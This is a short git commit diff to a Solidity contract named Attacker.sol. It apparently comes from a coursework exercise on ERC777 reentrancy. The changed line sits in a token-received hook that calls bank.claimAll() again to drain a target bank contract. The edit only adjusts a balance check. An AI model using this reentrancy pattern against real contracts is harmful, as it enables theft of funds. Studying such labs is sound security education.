97478c0865251cb11307f6d8f10f3bb545b3ab5d
lawrencechangit <118051543+lawrencechangit@users.noreply.github.com>
2023-03-15 23:36:37 +0800

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -62,7 +62,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-		if (from.balance > 0 ) {
+		if (address(from).balance > 0 ) {
             		bank.claimAll();
         }
 	}
